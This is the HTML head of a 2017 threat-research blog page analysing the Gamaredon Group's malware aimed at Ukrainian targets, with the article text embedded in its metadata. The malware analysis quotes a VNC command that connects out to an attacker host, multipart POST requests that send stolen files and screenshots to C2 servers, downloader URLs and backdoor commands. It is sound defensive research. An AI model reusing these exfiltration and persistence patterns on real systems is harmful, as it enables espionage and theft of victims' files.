
<!doctype html>
<html >
  <head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="apple-touch-icon" sizes="180x180" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-16x16.png">
	<link rel="manifest" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/site.webmanifest">
	<link rel="mask-icon" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/safari-pinned-tab.svg" color="#000000">
	<meta name="msapplication-TileColor" content="#000000">
	<meta name="theme-color" content="#000">
  <title>The Gamaredon Group Toolset Evolution</title>
<link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/unit-42-title-gamaredon-group-toolset-evolution/" />
<link rel="alternate" hreflang="ja" href="https://unit42.paloaltonetworks.jp/unit-42-title-gamaredon-group-toolset-evolution/" />

<!-- This site is optimized with the Yoast SEO plugin v12.6.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
<link rel="canonical" href="https://unit42.paloaltonetworks.com/unit-42-title-gamaredon-group-toolset-evolution/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="The Gamaredon Group Toolset Evolution" />
<meta property="og:description" content="Unit 42 threat researchers have recently observed a threat group distributing new, custom developed malware. We have labelled this threat group the Gamaredon Group and our research shows that the Gamaredon Group has been active since at least 2013." />
<meta property="og:url" content="https://unit42.paloaltonetworks.com/unit-42-title-gamaredon-group-toolset-evolution/" />
<meta property="og:site_name" content="Unit42" />
<meta property="article:tag" content="Gamaredon" />
<meta property="article:tag" content="malware" />
<meta property="article:tag" content="threat research" />
<meta property="article:tag" content="Toolset" />
<meta property="article:section" content="Unit 42" />
<meta property="article:published_time" content="2017-02-27T23:00:22+00:00" />
<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
<meta property="og:image:secure_url" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
<meta property="og:image:width" content="650" />
<meta property="og:image:height" content="300" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:description" content="Unit 42 threat researchers have recently observed a threat group distributing new, custom developed malware. We have labelled this threat group the Gamaredon Group and our research shows that the Gamaredon Group has been active since at least 2013." />
<meta name="twitter:title" content="The Gamaredon Group Toolset Evolution" />
<meta name="twitter:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//www.google.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Unit42 &raquo; The Gamaredon Group Toolset Evolution Comments Feed" href="https://unit42.paloaltonetworks.com/unit-42-title-gamaredon-group-toolset-evolution/feed/" />
<meta property="og:likes" content="1"/>
<meta property="og:readtime" content="15"/>
<meta property="og:views" content="43,324"/>
<meta property="og:date_created" content="February 27, 2017 at 3:00 PM"/>
<meta property="og:post_length" content="7610"/>
<meta property="og:category" content="Unit 42"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/unit42/"/>
<meta property="og:author" content="Anthony Kasza"/>
<meta property="og:author" content="Dominik Reichel"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/anthony-kasza/"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/dominik-reichel/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"The Gamaredon Group Toolset Evolution","name":"The Gamaredon Group Toolset Evolution","description":"Unit 42 threat researchers have recently observed a threat group distributing new, custom developed malware. We have labelled this threat group the Gamaredon Group and our research shows that the Gamaredon Group has been active since at least 2013.","url":"https:\/\/unit42.paloaltonetworks.com\/unit-42-title-gamaredon-group-toolset-evolution\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/unit-42-title-gamaredon-group-toolset-evolution\/","datePublished":"February 27, 2017","articleBody":"Unit 42 threat researchers have recently observed a threat group distributing new, custom developed malware. We have labelled this threat group the Gamaredon Group and our research shows that the Gamaredon Group has been active since at least 2013.\n\nIn the past, the Gamaredon Group has relied heavily on off-the-shelf tools. Our new research shows the Gamaredon Group have made a shift to custom-developed malware. We believe this shift indicates the Gamaredon Group have improved their technical capabilities. The custom-developed malware is fully featured an includes these capabilities:\n\n \tA mechanism for downloading and executing additional payloads of their choice\n \tThe ability to scan system drives for specific file types\n \tThe ability to capture screenshots\n \tThe ability to remotely execute commands on the system in the user\u2019s security context\n\nThe Gamaredon Group primarily makes use of compromised domains, dynamic DNS providers, Russian and Ukrainian country code top-level domains (ccTLDs), and Russian hosting providers to distribute their custom-built malware.\n\nAntimalware technologies have a poor record of detecting the malware this group has developed. We believe this is likely due to the modular nature of the malware, the malware\u2019s heavy use of batch scripts, and the abuse of legitimate applications and tools (such as wget) for malicious purposes.\n\nPreviously, LookingGlass reported on a campaign they named \"Operation Armageddon,\" targeting individuals involved in the Ukrainian military and national security establishment. Because we believe this group is behind that campaign, we\u2019ve named them the Gamaredon Group, an anagram of \u201cArmageddon\u201d. At this time, it is unknown if the new payloads this group is distributing is a continuation of Operation Armageddon or a new campaign.\nGamaredon: Historical Tool Analysis\nThe earliest discovered sample (based on compile times and sandbox submission times) distributed by this threat group resembles the descriptions of Gamaredon provided by Symantec and Trend Micro. Unfortunately, this identification is rather tenuous, as it seems to only identify the first variant of payloads used by our threat actors. Some samples of later payload variants also have been given the generic and brittle names of TROJ_RESETTER.BB and TROJ_FRAUDROP.EX.\n\nOriginally, the payloads delivered to targets by this threat group consisted of a password protected Self-extracting Zip-archive (.SFX) file which, when extracted, wrote a batch script to disk and installed a legitimate remote administration tool called tool Remote Manipulator System (Figure 1) which they would abuse for malicious purposes.\n\n\n\nFigure 1 Remote Manipulator System Interface\n\nOne such self-extracting archive (ca87eb1a21c6d4ffd782b225b178ba65463f73de6f4c736eb135be5864f556dc) was first observed around April of 2014.\u00a0 The password (reused by many of the password protected SFX payloads) it used to extract itself is \u201c1234567890__\u201d. The files included in this SFX file we observed include a batch file named \u201c123.cmd\u201d and another SFX named \u201csetting.exe\u201d. This second SFX contains a .MSI installer package which installs Remote Manipulator System and a batch script which handles the installation.\n\nLater payloads would write batch scripts to disk as well as wget binaries. The batch scripts would use the wget binaries to download and execute additional executables. The scripts would also use wget to send POST requests to command and control (C2) servers that would contain information about the compromised system. Some of these payloads included decoy documents that would open when the malware is executed.\n\nThree examples of this type of payload include:\n\n \ta6a44ee854c846f31d15b0ca2d6001fb0bdddc85f17e2e56abb2fa9373e8cfe7\n \tb5199a302f053e5e9cb7e82cc1e502b5edbf04699c2839acb514592f2eeabb13\n \t3ef3a06605b462ea31b821eb76b1ea0fdf664e17d010c1d5e57284632f339d4b\n\nWe first observed these samples using wget in 2014. The filenames and decoy documents these samples used attempt to lure individuals by using the presidential administration of Ukraine, Ukrainian national security and defense, the Anti-Terrorist Operation Zone in the Ukraine, and Ukrainian patriotism as subjects. The text of one such decoy document is pictured below.\n\n\n\nFigure 2 Ukrainian Decoy Document used by Gamaredon Group\n\nOther observed payloads would, again, use SFX files to deliver a batch script and an executable that allowed remote access through the VNC protocol. These VNC exectuables would either be included in the SFX file or downloaded by the batch script. We found one URL (now taken down) that hosted a VNC executable that the malware would attempt to download and install at hxxp:\/\/prestigeclub.frantov.com[.]ua\/press-center\/press\/chrome-xvnc-v5517.exe.\n\nThe batch script would then attempt to have the VNC program connect to a command and control (C2) server to enable the server to control the compromised system. All VNC installations on compromised systems that we observed have used the same configuration file, RC4 key file, and passwords.\n\nOne such sample, cfb8216be1a50aa3d425072942ff70f92102d4f4b155ab2cf1e7059244b99d31 first appeared around January of 2015. The batch script utilized in this sample ensures a VNC connection is available:\n start winlogons -autoreconnect -id:%sP% -connect grom56.ddns.net:5500\n\nThe path configured in the VNC configuration file across all implants employing VNC (UltraVNC.ini) is \u201cY:\\\u041f\u0420\u041e\u0411\u0410\\\u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0442\u0440\u043e\u044f\u043d\u043e\u0432\\\u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 RMS\\vnc\u201d. This isn\u2019t the only place hardcoded Cyrillic file paths are used by implants. Many of the batch scripts also use hardcoded paths such as \u201c\u0413\u043b\u0430\u0432\u043d\u043e\u0435 \u043c\u0435\u043d\u044e\\\u041f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b\\\u0410\u0432\u0442\u043e\u0437\u0430\u0433\u0440\u0443\u0437\u043a\u0430\u201d. Many payloads also include a VBS script which raises a dialog box to the users asking them to run the malware again. It reads, \u201c\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u0438 \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u044f (0xc0000005). \u041f\u043e\u0432\u0442\u043e\u0440\u0438\u0442\u044c \u043f\u043e\u043f\u044b\u0442\u043a\u0443 \u043e\u0442\u043a\u0440\u044b\u0442\u0438\u044f \u0444\u0430\u0439\u043b\u0430?\u201d (English Translation from Russian: Application failed to initialize (0xc0000005). Try to open the file again?).\n\nSome of the SFX files also include another legitimate application called ChkFlsh.exe (8c9d690e765c7656152ad980edd2200b81d2afceef882ed81287fe212249f845). This application was written by a Ukrainian programmer and is used to check performance of USB flash drives. Its value to the attackers to the attackers isn\u2019t clear but one possibility is that it is somehow used to steal or monitor files on USB devices. In our research, we found this application present in some SFX files along with VNC programs and in some SFX files that didn\u2019t have VNC programs included.\nCustom Implants\nWhile the most recent samples observed still use batch scripts and SFX files, the Gamaredon Group has moved away from applications like wget, Remote Manipulator Tool, VNC and ChkFlsh.exe. Instead of using wget the attackers are distributing custom developed downloaders, and instead of Remote Manipulator or VNC the malware is using a custom developed remote access implant.\n\nIn June of 2015 a custom downloader used by many newer samples was first seen in the wild and is often included in SFX implants with the name \u201cLocalSMS.dll\u201d. This downloader makes requests to adobe.update-service[.]net (hardcoded in the sample) and is further discussed in Appendix A.\n\nIn February 2016, another custom tool now often included in SFX implants was seen in the wild. This SFX file (3773ddd462b01f9272656f3150f2c3de19e77199cf5fac1f44287d11593614f9) contains a new Trojan (598c55b89e819b23eac34547ad02e5cd59e1b8fcb23b5063a251d8e8fae8b824) we refer to as \u201cPteranodon.\u201d Pteranodon is a custom backdoor which is capable of the following tasks:\n\n \tCapturing screenshots at a configurable interval and uploading them to the attacker\n \tDownloading and executing additional files\n \tExecuting arbitrary commands on the system\n\nThe earliest version of Pteranodon uses a hardcoded URL for command and control. It sends POST requests to \u201cmsrestore[.]ru\/post.php\u201d using a static multipart boundary:\n------------870978B0uNd4Ry_$\nNewer versions of the tool also use hardcoded domains and multipart boundaries. They also share similar pdb strings. Other Pteranodon samples can be found in AutoFocus using the Pteranodon tag. The most recent variant of Pteranodon is analyzed in Appendix A.\n\nWe have only identified one delivery vector for the new implants thus far. A Javascript file (f2355a66af99db5f856ebfcfeb2b9e67e5e83fff9b04cdc09ac0fabb4af556bd) first seen in December of 2016 downloads a resource from http:\/\/samotsvety.com[.]ua\/files\/index.pht (likely a compromised site used for staging payloads) which previously an SFX file (b2fb7d2977f42698ea92d1576fdd4da7ad7bb34f52a63e4066f158a4b1ffb875) containing two of the Gamaredon custom tools.\n\nA related sample (e24715900aa5c9de807b0c8f6ba8015683af26c42c66f94bee38e50a34e034c4) used the same distinct Mutex and contains a larger set of tools for analysis. The original name of the file is \"AdapterTroubleshooter.exe\" and the file uses icons which resemble those used by OpenVPN, as seen below.\n\n\n\nUpon examining the sample's file activity within AutoFocus it is clear the sample is a self-extracting executable.\n\n\n\nFigure 3 Self Extracting executable behavior shown in AutoFocus\n\nOpening the sample with 7zip inside of a virtual machine, all the files contents can be examined. Below is a table providing the SHA256 values, the filenames, the compile timestamps and the pdb paths of the contents of the SFX file.\n\n\n\nSHA256\nFilename\nCompile Time\nPDB Path\n\n\n400f53a89d08d47f608e1288d9873bf8d421fc7cd642c5e821674f38e07a1501\nLocalSMS.dll\nWed Apr 29 08:10:30 2015\nc:\\users\\viber\\documents\\visual studio 2013\\projects\\contextmenu\\release\\contextmenu.pdb\n\n\nd01df47b6187631c9a93bdad1298439ab1a1c5529b3319f3614b6ec2455e5726\nMpClients.dll\nThu Sep 08 05:01:00 2016\nc:\\users\\user\\documents\\visual studio 2015\\projects\\updaterv1\\release\\updaterv1.pdb\n\n\nf2296bcb6be68dfb330baec2091fb11a42a51928ba057164213580e6ff0e1126\nOfficeUpdate.dll\nWed Dec 07 09:25:57 2016\n-\n\n\n2ded2f3b5b5b6155ce818893c67887cbfa8b539be6c983e314ccf2177552da20\nSmartArtGraphicsLog.lnk\n-\n-\n\n\n46a39da996b01e26ddd71d51c9704de2aa641cd3443f6fe0e5c485f1cd9fa65d\nUsrClass.lnk\n-\n-\n\n\na972ad0ddc00d5c04d9fe26f1748e12008efdd6524c9d2ea4e6c2d3e42d82b7b\ncondirs.cmd\n-\n-\n\n\n37c78ee7826d63bb9219de594ed6693f18da5db60e3cbc86795bd10b296f12ac\nwinrestore.dll\nMon Jan 09 03:12:39 2017\nc:\\develop\\ready\\winrestore - proxy\\release\\winrestore.pdb\n\n\n90ba0f95896736b799f8651ef0600d4fa85c6c3e056e54eab5bb216327912edd\nwmphost.exe\nThu Dec 01 08:23:32 2016\nc:\\develop\\ready\\mouse-move\\mouse-move\\release\\mouse-move.pdb\n\n\n\nThe bootstrapping logic for the sample relies on the contents of \"condirs.cmd\". Briefly, the logic within \"condirs.cmd\" follows:\n\n1. Ensure \"%LOCALAPPDATA%\\Microsoft\\Windows\\\" exists\n2. Kill and delete processes, files, and scheduled tasks which may interfere with the sample executing\n3. Copy \"winrestore.dll\" to \"%LOCALAPPDATA%\\Microsoft\\Windows\\UsrClass.dat{4f6fe187-7034-11de-b675-001d09fa5win}.dll\"\n4. Copy \"OfficeUpdate.dll\" to \"%LOCALAPPDATA%\\Microsoft\\Windows\\UsrClass.dat{4f6fe187-7034-11de-b675-001d09fa5off}.dll\"\n5. Determine if the operating system is Windows XP or Windows 7\n6. If the system is running Windows XP\na. Set the directory to copy files into as \"%WINDIR%\\Setup\\State\\Office\"\nb. Copy \"UsrClass.lnk\" to \"%USERPROFILE%\\\u0413\u043b\u0430\u0432\u043d\u043e\u0435 \u043c\u0435\u043d\u044e\\\u041f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b\\\u0410\u0432\u0442\u043e\u0437\u0430\u0433\u0440\u0443\u0437\u043a\u0430\\\"\nc. Copy \"SmartArtGraphicsLog.lnk\" to \"%USERPROFILE%\\\u0413\u043b\u0430\u0432\u043d\u043e\u0435 \u043c\u0435\u043d\u044e\\\u041f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b\\\u0410\u0432\u0442\u043e\u0437\u0430\u0433\u0440\u0443\u0437\u043a\u0430\\\"\n7. If the system is running Windows 7\na. Set the directory to copy files into as \"%APPDATA%\\Microsoft\\Office\"\nb. Copy \"UsrClass.lnk\" to \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\nc. Copy \"SmartArtGraphicsLog.lnk\" to \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\n\n\nFigure 4 Windows XP and Windows 7 logic within \"condirs.cmd\"\n\n8. Copy \"winrestore.dll\" to the directory set in step 6 or 7a with the filename \"MSO1234.win\"\n\n9. copy \"LocalSMS.dll\" to the directory set in step 6 or 7a with the filename \"MSO1567.dls\"\n\n10. copy \"OfficeUpdate.dll\" to the directory set in step 6 or 7a with the filename \"MSO5678.usb\"\n\n11. copy \"MpClients.dll\" to the directory set in step 6 or 7a with the filename \"MSO8734.obn\"\n\n12. Execute the exported function \"updater\" within \"MSO1234.win\" using rundll32.exe\n\n13. Execute the exported function \"EntryPoint\" within \"MSO1567.dls\" using rundll32.exe\n\nIt should be noted that \"UsrClass.lnk\" links to \"%WINDIR%\\system32\\rundll32.exe UsrClass.dat{4f6fe187-7034-11de-b675-001d09fa5win}.dll,updater\" and \"SmartArtGraphicsLog.lnk\" links to \"C:\\WINDOWS\\system32\\rundll32.exe UsrClass.dat{4f6fe187-7034-11de-b675-001d09fa5off}.dll,StartBackup\". These are the locations \"winrestore.dll\" and \"OfficeUpdate.dll\" were copied to in steps 3 and 4, respectively.\n\nThe \"condirs.cmd\" script then continues to:\n\n1. Schedule the following tasks:\na. Task name \"UpdatesWinRes\", invoke \"MSO1234.win,updater\"\nb. Task name \"UpdatesWinDLL\", invoke \"MSO1567.dls,EntryPoint\"\nc. Task name \"UpdatesWinUSBOOK\", invoke \"MSO5678.usb,StartBackup\"\nd. Task name \"UpdatesWinOBN\", invoke \"MSO8734.obn,bitDefender\"\n2.\u00a0Ensure the directory \"%Temp%\\reports\\ProfileSkype\\\" exists\n\n3.\u00a0Kill processes named \"skype.exe\"\n\n4.\u00a0Copy the contents of \"%AppData%\\Skype\" to \"%Temp%\\reports\\ProfileSkype\\\"\n\n5.\u00a0Create subdirectories under \"%Temp%\\reports\\%COMPUTERNAME\\\" with names: Z W P S V Q N M L K I J F H E G and D. These are drive letters.\n\n6.\u00a0Copy all files from all above drive letters with extensions \"doc\", \"docx\",\u00a0 \"xls\",\u00a0 \"xlsx\", \"rtf\" \"odt\" and \"txt\" into \"%TEMP%\\reports\\%COMPUTERNAME%\\%%d\\\" where %%d is the drive letter\n\n7.\u00a0Copy all files with the above extensions from all users' \"Desktop\", \"Documents\", and \"Downloads\" folders to \"%TEMP%\\reports\\%COMPUTERNAME%\\Desktop\\\", \"%TEMP%\\reports\\%COMPUTERNAME%\\Documents\\\" and \"%TEMP%\\reports\\%COMPUTERNAME%\\Downloads\\\" respectively\n\n\n\nFigure 5 The document stealing logic inside \"condirs.cmd\"\n\n8.\u00a0Execute the exported function \"StartBackup\" within \"MSO5678.usb\" using rundll32.exe\n\n9.\u00a0Execute the exported function \"bitDefender\" within \"MSO8734.obn\" using rundll32.exe\n\n10.\u00a0Clean up temporary files, sleep, and delete itself\n\nWhen this script has completed, a series of implants giving the attacker the ability to steal files, capture screenshots and evade detection are deployed on the system. These individual implants are analyzed in detail in Appendix A.\nTrends Across Implants\nWhile the payloads used to control compromised systems have evolved over time, many commonalities appear across the samples. While not every sample distributed by this group is described in this blog, hashes of the known samples are included in the Indicators of Compromise section. Some interesting behaviors from a few of the related samples include:\n\n \tMany of the batch scripts include misspellings of common English words. One such example is the filename \"cmd\". While another example, \"domen\", is used as a variable name in a batch script which is likely meant to be \"domain\"\n \tAlmost all batch scripts in all samples ping localhost as a means of sleeping\n \tMany of the batch scripts are named \"cmd\" and some include the string \"Trons_ups\" and \"Treams\"\n \tMany of the batch scripts use the same commands for determining operating system version.\n \tMany of the early samples used applications such as wget, UltraVNC, and ChkFlash. These utilities have been replaced with custom tools in the latest sample\n \tSamples employing VNC used the same configuration and passwords\n\nAdditionally, the infrastructure used by this group has not changed much in the past three years. Many of the samples reused the same domains for implant communication. Also, many of the custom developed tools use hardcoded network locations.\n\nMonikers used for filenames, exported DLL functions, domains, and variable names in scripts seem to be themed and consistent. By pivoting on indicators from one of the SFX implants within AutoFocus additional samples are easily identified by overlaps in these consistencies. Most samples were delivered in a similar fashion: an SFX dropping resources which are staged and loaded with a batch and\/or VBS script. The reuse of SSL certificates between IPv4 addresses as well as the reuse of IPv4 addresses between domains names is apparent when viewing a large collection of entities involved in this campaign, as shown below.\n\n\n\nFocusing in on one of the newest samples (analyzed in Appendix A), the reuse of file names as well as SFX content files becomes apparent.\n\n\n\nFigure 6 Overview of the relationships between Samples and Network Infrastructure used by the Gamaredon Group\nFinal Word\nThe implants identified have limited, generic, and often conflicting detections on VirusTotal. The threat group using these implants has been active since at least 2014 and has been seen targeting individuals likely involved in the Ukrainian government. Some of the samples share delivery mechanisms and infrastructure with samples which are detected by a few antivirus vendors as Gamaredon. However, newer variants deliver more advanced malware which goes unnamed.\n\nPeriodically, researchers at Palo Alto Networks hunt through WildFire execution reports, using AutoFocus, to identify untagged samples' artifacts in the hopes of identifying previously undiscovered malware families, behaviors, and campaigns.\n\nThis blog presents a threat group identified by the above process using AutoFocus. By actively hunting for malicious activity and files instead of waiting for alerts to triage, defenders can identify and building protections for new trends before they arrive on their corporate networks and endpoints. More details about this threat group can be found in the AutoFocus tag GamaredonGroup.\n\nPalo Alto Networks customers are protected from this threat in the following ways:\n\n \tWildFire identifies the malware described in this report as malicious.\n \tTraps prevents execution of the malware described in this report.\n \tThe C2 domains used by this group are blocked through Threat Prevention.\n\nSpecial thanks go out to Tom Lancaster for both his assistance in this investigation and for his charming good looks.\nAppendix A: Custom Implant Analyses\nUSBStealer: MSO5678.usb \/ OfficeUpdate.dll\nThis file is a USB file stealer which can be also guessed by its internal name \"USBgrabber.dll\". However, the implementation is sloppy which makes it a file stealer for any newly connected logical volume on a system. This is because the malware monitors the computer for messages WM_COMMAND and WM_DEVICECHANGE, but not verifying if a USB drive was connected.\n\nThe malware creates two mutexes \"__Wsnusb73__\" and \"__Wsnusbtt73__\". Then, it creates the following folder in the temp path of the local user:\n\n\"C:\\Users\\&lt;Username&gt;\\AppData\\Local\\Temp\\reports\"\n\nThis folder is used as a temporary location to copy all files from a newly connected logical drive to and upload them to the C2 server. The files are transferred to the hardcoded C2 server \"195.62.52.93\" one by one via HTTP POST method. The following request is used which also includes information about the victim, the file to be transferred as well as the source drive:\nPOST \/post.php HTTP\/1.1\nContent-Type: multipart\/form-data; boundary=----qwerty\nHost: 195.62.52.93\nContent-Length: ...\nCache-Control: no-cache\n\n------qwerty\nContent-Disposition: form-data; name=\"filename\"\n\n\\\\&lt;filename&gt;\n------qwerty\nContent-Disposition: form-data; name=\"filedate\"\n\n&lt;month&gt;\/&lt;day&gt;\/&lt;year&gt; &lt;hour&gt;:&lt;seconds&gt;\n------qwerty\nContent-Disposition: form-data; name=\"compname\"\n\n&lt;ComputerName&gt;||&lt;Username&gt;||&lt;UserHWGUID&gt;||&lt;C_VolumeSerialNumber&gt;\n------qwerty\nContent-Disposition: form-data; name=\"serial\"\n\n&lt;SerialNumberOfDriveToStealFrom&gt;\n------qwerty\nContent-Disposition: form-data; name=\"w\"\n\n\"?\"\n------qwerty\nContent-Disposition: form-data; name=\"filesize\"\n\n&lt;FileSize&gt;\n------qwerty\nContent-Disposition: form-data; name=\"file\"; filename=\"&lt;AbsoluteFilePathInTemporaryLocation&gt;\"\nContent-Type: application\/octet-stream\nContent-Transfer-Encoding: binary\n\n...File data...\n\n------qwerty--\n\nThe malware also creates a SQLite database named \"asha.dat\" in the local users temp folder. Therein, it keeps track of files which were stolen by calculating the MD5 hash of the filename followed by the file length. Therefore, it creates a Unicode string of the original file path from the drive and concatenates the file size in bytes to it. Finally, it uses the API functions MD5Init(), MD5Update() and MD5Final() to calculate the hash and store it in the database.\n\n\n\nFigure 7 Structure of the database created by the malware\n\nIt should be noted, that only hashes of files are added to the database that don't have the following extensions:\n\n \tDLL\n \tBIN\n \tCAB\n \tEXE\n \tISO\n\nDownloader: MSO1567.dls \/ LocalSMS.dll\nThis file is essentially a simple downloader which contacts the C2 server to send some user data and get an executable as response which will be executed. The DLL is written in C++ and contains all of the functionality is in an export function named \"EntryPoint\". The file was compiled without any compiler or linker optimizations, thus the big file size and the remaining PDB path string.\n\nAt first, the malware retrieves the temp path of the local user (\"C:\\Users\\&lt;Username&gt;\\AppData\\Local\\Temp\\\"), the computer name (e.g. \"WIN-MLABCSUOVJB\"), the hardware profile GUID (e.g. \"{826ee360-7139-11de-8d20-808e6f6e6263}\") and the volume serial number of C:\\ drive (e.g. \"1956047236\"). Next, it takes the following hardcoded string:\n\nhttp:\/\/adobe.update-service[.]net\/index.php?comp=\n\nTo create a URL string with the victims information for contacting the C2 server:\n\n \thttp:\/\/adobe.update-service[.]net\/index.php?comp=WIN-MLABCSUOVJB&amp;id=WIN-MLABCSUOVJB_{826ee360-7139-11de-8d20-808e6f6e6263}1956047236\n\nTo create the filename where the downloaded file will be saved, the malware tries to build a random string of 10 characters. However, due to an implementation error the string always ends up being the same, namely \"frAQBc8Wsa\". This string gets concatenated with the retrieved local users temp path to the following file path:\n\n \tC:\\Users\\&lt;Username&gt;\\AppData\\Local\\Temp\\frAQBc8Wsa\n\nThen, it uses the API function URLDownloadToFileA() to download a payload to disk and executes it via CreateProcess(). Finally, it sleeps for 60 seconds before terminating the payload and the DLL exits.\nDownloader: MSO8734.obn \/ MpClients.dll\nThis file is a slightly more advanced version of LocalSMS.dll downloader. Instead of downloading a payload directly to disk, this file requests a download command from the C2 server which contains the actual payload URL to be used. Therefore, it uses a basic network implementation based on the Winsock functions. All the functionality of this DLL is put into an export function named \"bitDefender\".\n\nIt creates a socket, requests the address of the hardcoded C2 server \"win-restore.ru\" via gethostbyname() and connects to it. Thereafter, it also collects the volume serial number of C:\\ drive, the computer name and the hardware profile GUID. With this information, it creates the following string used by a subsequent send() function call:\n\n\"GET \/css.php?id=WIN-MLABCSUOVJB_{826ee360-7139-11de-8d20-808e6f6e6263}1956047236 HTTP\/1.1\nHost: win-restore.ru\nConnection: close\"\n\nThe response will be stored into a memory buffer via recv() and scanned for the string \"urltoload={\". As the name suggests, the received data contains the actual URL of the payload inside curly brackets. The URL gets pulled out of the string and is used again as input for the API function URLDownloadToFile(). Again, the same file path will be used to store the payload on disk and execute it:\n\"C:\\Users\\&lt;Username&gt;\\AppData\\Local\\Temp\\frAQBc8Wsa\"\nPteranodon: MSO1234.win \/ winrestore.dll\nPteranodon is a backdoor which also can capture screenshots based on a configuration file created on the disk. Further, it uploads the screenshots to the C2 server unencrypted. All the functionality of this DLL is put into an export function named \"updater\".\n\nAt first, it retrieves the %APPDATA% folder of the local user to build the following file path:\n\n\"C:\\Users\\&lt;Username&gt;\\AppData\\Roaming\\Microsoft\\desktop.ini\"\n\nThen, it checks if the file already exists and continues execution if so. If not, it runs a routine which checks if there is mouse movement as an anti-sandbox technique. If no mouse movement is detected the malware runs in an infinite loop checking for mouse movement.\n\nIf the file \"desktop.ini\" does not exist, the malware creates it and writes the following information into it:\n\n\" interval={60} msfolder={10} status={0}\"\n\nThis information is used as configuration data to create the screenshots. There are also other commands possible which can be retrieved from the C2 server. The following commands are available:\n\nexec={\n\nThis command is used to download and execute a payload from a URL present in the curly brackets. It creates a random file path in temp folder, calls URLDownloadToFile() and CreateProcess() to run the payload. Then, it waits 30s and terminates the payload.\n\ninterval={\n\nThis command is used to define the interval in seconds between the creation of two or more screenshots.\n\nmsfolder={\n\nThis command defines the number of screenshots to create.\n\ncommand={ \/ command_c={\n\nThis command is used to execute a file present as a string between the curly brackets. The variant with the \"c\" uses the Windows tool cmd.exe with help of ShellExecute().\n\nstatus={\n\nThis command contains the flag which defines if screenshots should be made (\"1\") or not (\"0\").\n\nNext, it checks for a mutex named \"asassin1dj\" to verify if the system is already infected and creates it if this isn't the case:\n\n\n\nFigure 8 Mutex check and creation routine\n\nNext, it creates the following folder, if not already present:\n\n\"C:\\Users\\&lt;Username&gt;\\AppData\\Roaming\\Microsoft\\store\"\n\nNext, according to the configuration data in \"desktop.ini\" it constantly creates 24-bit color depth JPEG screenshots without extension in the store folder with help of GDI32 and gdiplus API functions. The following file naming scheme for the screenshots is used:\n\n&lt;year&gt;&lt;month&gt;&lt;day&gt;_&lt;hour&gt;&lt;minute&gt;&lt;seconds&gt;\n\nAfter the last screenshot was created, it uploads all files from the \"store\" folder to the C2 server \"win-restore[.]ru\". Then, it deletes all the files present in the folder and starts a new screenshot creation cycle. It should be noted that there is no check of what files are uploaded. The files are uploaded via POST HTTP method to the script \"vvd.php\". For this, the following HTTP request is used which contains also data from the victim as well the JPEG files:\nPOST \/vvd.php HTTP\/1.1\nAccept: application\/x-www-form-urlencoded\nConnection: Keep-Alive\nContent-Type: multipart\/form-data; boundary=----------987978B0urd3Gf_$\nAccept-Charset: utf-8\nUser-Agent: asasing\nHost: win-restore.ru\nContent-Length: &lt;length&gt;\nCache-Control: no-cache\n\n------------987978B0urd3Gf_$\nContent-Type: text\/html\nContent-Disposition: form-data; name=\"uuid\"\n\nWIN-MLABCSUOVJB_{826ee360-7139-11de-8d20-808e6f6e6263}1956047236\n------------987978B0urd3Gf_$\nContent-Type: application\/octet-stream\nContent-Disposition: form-data; name=\"file0\"; filename=\"&lt;year&gt;&lt;month&gt;&lt;day&gt;_&lt;hour&gt;&lt;minute&gt;&lt;seconds&gt;\"\nContent-Transfer-Encoding: 8bit\n...JPEG file...\n------------987978B0urd3Gf_$\nContent-Type: application\/octet-stream\nContent-Disposition: form-data; name=\"file1\"; filename=\"&lt;year&gt;&lt;month&gt;&lt;day&gt;_&lt;hour&gt;&lt;minute&gt;&lt;seconds&gt;\"\nContent-Transfer-Encoding: 8bit\n...JPEG file...\n...\n------------987978B0urd3Gf_$\n\nFinally, it checks if any new command information is available from the C2 server and updates the \"desktop.ini\" file according to it. Based on functionality, compile timestamps, and 